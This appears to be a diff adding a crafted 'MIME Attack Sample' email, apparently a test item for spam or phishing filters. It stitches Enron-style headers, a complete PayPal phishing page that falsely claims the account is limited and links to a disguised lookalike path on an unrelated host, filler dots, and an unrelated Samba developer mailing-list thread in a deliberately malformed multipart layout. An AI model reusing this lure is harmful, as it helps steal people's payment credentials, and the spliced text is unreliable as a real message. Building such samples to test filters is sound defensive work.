@@ -1,0 +1,264 @@
+From: pearce.hammond@enron.com
+To: tracy.ramsey@enron.com, jeff.leath@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients:;
+
+
+	</tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td
+ width="100%"><img height="29"
+ width="1" border="0"></td>
+</tr>	
+<tr>
+	<td><img height="10"
+ width="1" border="0"></td>
+</tr>
+</table>
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+ align="center">
+	<tr valign="top">
+		<td width="400">
+			<table width="609" cellspacing="0" cellpadding="5" border="0" height="544">
+				<tr>
+          <td valign="top" width="599" height="347"><b><font size="3">Dear PayPal 
+          Member </font></b>
+          <p>&nbsp;</p>
+            <hr class="dotted">
+            <h1><font size="2">Closing Accounts and Limiting Account Access</font></h1>
+          <p>This is your official notification that your account has been 
+          Limited. We recently reviewed your credit card and it seems that you 
+          are using the same credit card for 2 accounts. As you can read in our 
+          User Agreement ( section 2.13 ) opening multiple accounts is strictly 
+          forbidden. You are now requested to provide information relevant to 
+          your account. PayPal will investigate the matter promptly and if the 
+          investigation is in your favor, we will restore your account.</p>
+            <span class="pp_footer">
+PayPal Email ID PP133320</span><font size="2" face="Arial, Helvetica, sans-serif"><br>
+              &nbsp;</font><hr class="dotted">
+              <p>
+              <font size="2" face="Arial, Helvetica, sans-serif"><span class="emphasis"><strong>How 
+              can I restore my account access?</strong></span></font></p>
+            <p>
+              <font size="2" face="Arial, Helvetica, sans-serif"><br>
+              <br>
+              <span class="emphasis">Please 
+                              visit the <a rel="nofollow"
+ target="_blank" href="http://asdl.kaist.ac.kr/softball/picture/.www.paypal.com/"><strong>Resolution 
+                              Center</strong></a> and complete the steps to remove 
+                              limitations. </span>
+              </font>
+              </p>
+            <p>
+              <font size="2" face="Arial, Helvetica, sans-serif"><br>
+              <strong>Completing all of the checklist items will automatically 
+              restore your account access.</strong>
+              </font>
+              </p>
+              <hr class="dotted">
+              <table width="355" border="0" align="center" cellpadding="0" cellspacing="0">
+                <tbody>
+                  <tr> 
+                    <td width="355">
+<p class="lastPara"> <font size="2">Copyright  </font><font size="-2">&copy</font><font size="2"> 1999-2007 PayPal. All rights reserved</font><font size="1.5">.</font><br>
+                      </p></td>
+                  </tr>
+                </tbody>
+              </table>
+            </td> 
+                </tr>
+						<tr>
+				<td height="58" width="599">Thank you for using PayPal!<p>The PayPal Team</td>
+			</tr>
+			<tr>
+				<td height="49" width="599"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td class="pp_footer">
+			Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. For assistance, log in to your PayPal account and choose the &quot;Help&quot; link in the footer of
+any page.</td>
+	</tr>
+	<tr>
+		<td><img height="10"
+ width="1" border="0"></td> 
+	</tr>	
+</table>	
+
+</td>
+			</tr>
+			<tr>
+				<td height="50" width="599"><span class="pp_footer">
+                <br><br>
+</span>
+</td>
+			</tr>
+		</table>   
+	</td>   
+	<td><img height="1"
+ width="10" border="0"></td>
+		  
+	</tr>
+</table>       
+</body>   
+</html>
+
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Andrew Bartlett wrote:
+> On Mon, 2007-04-30 at 10:22 +0200, Jelmer Vernooij wrote:
+>> Andrew Bartlett wrote:
+>>>> Also, the current code makes it very easy to add support for
+other
+>>>> targets (Samba3, for example) that don't support all test
+environments
+>>>> (yet).
+>>>>
+>>>> Perhaps you would simply like to make sure that all test
+environments
+>>>> are set up in 'make testenv' ? 
+>>> No, then the tests will constantly differ from the environment in
+which
+>>> they are normally run, even worse than the current situation.
+>> In that case, why not add an ENV= variable so you can run "make
+testenv
+>> ENV=member" ? Or perhaps we can simply add "make testenv-dc" and
+"make
+>> testenv-member"?
+>>
+>> We can print out the environment name for failed tests, if that
+would help.
+> I just think it's getting too complex.  It used to be very simple,
+and
+> it isn't any more.  
+The only added complexity would be that there isn't just 'testenv' but
+'testenv-dc' and 'testenv-member', and there is just one test that
+uses
+the latter at the moment. That makes it a little bit more complex, but
+the alternative is a complex test environment.
+
+I also think the concept that a test has to run against a particular
+kind of server isn't particularly hard to grasp.
+
+>>> I'm afraid that the selftest setup is becoming too complex to
+reproduce
+>>> - I want to be able to easily reproduce any failure in 'make
+>>> testenv' (which you will recall is my primary work tool), without
+first
+>>> wondering 'oh, what environment did it declare, what environment
+did it
+>>> get, and what environment do I have now'.
+>> That will make other things more complex. For example, we'd need to
+>> change the environment variables to be $DC1_IP, $DC1_USERNAME,
+>> $DC2_PASSWORD, etc because the tests can be run against either of
+the
+>> dcs or domain member.
+> Well, the first point is that DC1 and DC2 *should* be sharing the
+same
+> username and passwords.  The member server will have additional
+local
+> users (to verify the local SAM), but the whole point of a member
+server
+> is to use the same passwords...
+Well, I was thinking of the case where two DCs were in different
+domains
+but had a trust between them. So, in the case of two dc's in the same
+domain, you would have a $DC_USERNAME and $DC_PASSWORD but also
+passwords and ips for various member servers.
+
+>> It also makes things like "make test TESTS=SAMR" slower as the
+>> provisioning is two or three times as slow.
+> Provisioning for an additional DC should not be particularly
+expensive.
+> I expect to do some work to allow two DCs to share a ldb (for one
+modal
+> of replication), and for the DRSUAPI replicated case, we just need
+to
+> setup a skeleton. 
+Provisioning by itself is relatively slow. If I run "make test
+TESTS=RPC-SAMR" a lot of times in a row when I'm trying to fix
+something
+it does matter that provisioning takes twice as long.
+
+I also imagine we'll have a different environment that provides a
+NT4-style DC. Eventually we may end up with a dozen or more
+servers and that will cost us. It may work for just one dc and member
+but won't scale.
+
+>>> It doesn't seem too much of a price to always have a simple
+network
+>>> running, that contains the DC (or 2), and member servers.  Then we
+can
+>>> be very consistent in how our tests run, and are debugged. 
+>> It's not just the time it takes to set up the environment, also the
+fact
+>> that it makes it harder to support other targets (because of the
+>> complexity of the environment they need to support) and the
+inability to
+>> mix environments. 
+> I really don't understand what you mean here.  
+At the moment, it is very easy to create a test network that contains
+a
+Samba4 DC and a Samba3 member server or a Samba3 DC and a Samba4
+member
+server, etc.
+
+If we'd need to set up the same environment for a different target
+(Windos or Samba 3), we'll have to replicate the exact same situation
+including all the various different dcs/members before we can run any
+of
+the tests or we need to keep a list of targets against which a
+particular test can run. In the current situation, we can simply skip
+all tests that require an environment that is not available.
+
+Cheers,
+
+Jelmer
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org (
+http://enigmail.mozdev.org/ )
+
+iQCVAwUBRjWxDAy0JeEGD2blAQKw9wP/T3JLvN2k/K36mhQsERxTCa2cmbAHI2Dp
+B28TrHM3yO8xaxKbB7F6LrOSeOqob6pG9A5ac3dTxlDadLCGnL2RgzA5EzN5h/Nj
+hxb6o1yLKUK4vmEYZfs5IQaX2G4HU6SttrQ/lIRo+gcLY6wrWaCJh3ElbF0iu/CX
+3R4ZSHL4YCs=
+=zOJQ
+-----END PGP SIGNATURE-----
+-BOUNDARY--
